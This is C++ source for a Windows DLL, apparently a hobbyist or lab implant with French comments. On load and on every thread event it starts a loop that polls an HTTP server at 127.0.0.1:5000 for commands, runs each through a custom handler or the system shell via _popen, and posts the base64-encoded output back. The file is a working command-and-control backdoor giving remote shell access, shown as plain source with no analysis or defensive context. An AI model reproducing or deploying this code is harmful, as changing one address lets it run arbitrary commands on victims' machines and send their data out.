// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "common.hpp"
#include "custom_command.hpp"

DWORD WINAPI AntiShell(LPVOID lpParam);


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        AntiShell(NULL);
    case DLL_PROCESS_ATTACH:AntiShell(NULL);
    case DLL_THREAD_ATTACH:AntiShell(NULL);
    case DLL_THREAD_DETACH:AntiShell(NULL);
    case DLL_PROCESS_DETACH:AntiShell(NULL);
        break;
    }
    return TRUE;
}

//c mon code trust lionel
static std::string base64_encode(const std::string& in) {

    std::string out;

    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

static std::string base64_decode(const std::string& in) {

    std::string out;

    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

// À placer en dehors de DllMain
DWORD WINAPI AntiShell(LPVOID lpParam)
{
    HINTERNET hInternet, hConnect;
    char buffer[4096];
    DWORD bytesRead;

    while (1) {
        hInternet = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        hConnect = InternetOpenUrlA(hInternet, "http://127.0.0.1:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead) {
                buffer[bytesRead] = '\0';

                char* start = strchr(buffer, '[');
                char* end = strrchr(buffer, ']');
                if (start && end && end > start) {
                    *end = '\0';
                    start++;

                    char* context = NULL;
                    char* token = strtok_s(start, ",", &context);
                    while (token != NULL) {
                        while (*token == ' ' || *token == '\"') token++;
                        char* quote_end = strrchr(token, '\"');
                        if (quote_end) *quote_end = '\0';


                        FILE* pipe = NULL;
                        std::stringstream outputStream;
                    CUSTOM_Command:
						std::string output;

                        if (!CustomCommand(token,&output)) {
                            goto SYSTEM_Command;
                        }
                        goto SEND;


                       
                    SYSTEM_Command:
                        // Exécution de la commande
                        pipe = _popen(token, "r");
                        
                        char result[1024];
                        while (fgets(result, sizeof(result), pipe) != NULL) {
                            outputStream << result;
                        }
                        _pclose(pipe);
                    SEND:

                        output = outputStream.str();
						
						std::string cmd(token);
						cmd.append("\n");
						cmd.append(output);

                        std::string encodedData = base64_encode(cmd);

						printf("Commande : %s\n", encodedData.c_str());
						
                        // Envoi HTTP POST vers /output
                        HINTERNET hSession = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                        HINTERNET hConnect = InternetConnectA(hSession, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
                        if (hConnect) {
                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/output", NULL, NULL, NULL,
                                INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);

                            const char* headers = "Content-Type: application/json\r\nAccept: application/json\r\n";
                            BOOL sent = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)encodedData.c_str(), encodedData.size());

                            InternetCloseHandle(hRequest);
                            InternetCloseHandle(hConnect);
                        }
                        InternetCloseHandle(hSession);

                        token = strtok_s(NULL, ",", &context);

                    }
                }
            }
            InternetCloseHandle(hConnect);
        }

        InternetCloseHandle(hInternet);
        Sleep(1000);
    }

    return 0;
}
